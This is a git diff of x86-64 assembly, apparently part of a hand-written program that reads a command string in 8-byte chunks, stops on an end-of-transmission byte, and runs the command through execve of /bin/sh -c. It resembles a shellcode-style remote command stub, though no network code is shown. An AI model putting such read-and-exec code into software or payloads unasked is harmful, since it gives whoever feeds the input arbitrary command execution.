@@ -85,6 +85,16 @@ _read:
         ; save rax
         ;mov rcx, rax
 
+        cmp rax, 1
+        jne .isnotendoftransmission
+            mov al, byte [r15]
+            cmp al, 0x04
+            je .endofcommand
+            mov rax, 60
+            mov rdi, 0x01
+            syscall
+        .isnotendoftransmission:
+
         xor rcx, rcx  ; cx-register is the counter, set to 0
         xor rdx, rdx  
         xor r14, r14
@@ -95,8 +105,6 @@ _read:
         jne .donotsavestartcommand
             mov r12, r14 ; save start of command string
         .donotsavestartcommand:
-
-
         ; add to total read bytes
         add rbx, rax
 
@@ -107,15 +115,14 @@ _read:
             
             cmp byte [r15 + rcx], 0x0a ; is character equal to \n
             jne .isnormalchar
-                mov byte [r14], 0x22 ; add "
-                dec rax
-                jmp .skiploopstring
+                mov byte [r15 + rcx], dl ; add "
             .isnormalchar:
             mov dl, byte [r15 + rcx]
             mov byte [r14], dl
             ;rol rdx, 8
             ;mov dl, byte [r15 + rcx]
             ;nop         ; Whatever you wanna do goes here, should not change cx
+            xor rdx, rdx
             inc rcx      ; Increment
             inc r14
             cmp rcx, rax    ; Compare cx to the limit
@@ -127,11 +134,13 @@ _read:
         cmp rax, 8                      ; if has reach end of message
         je .readloop
 
+        .endofcommand:
     
     
     ; EXECVE /BIN/SH
     ;mov rdx, rsp
     push rdx
+    mov rdx, rsp
     mov rbx, 0x632d       ; -c
     push rbx
     mov rcx, rsp
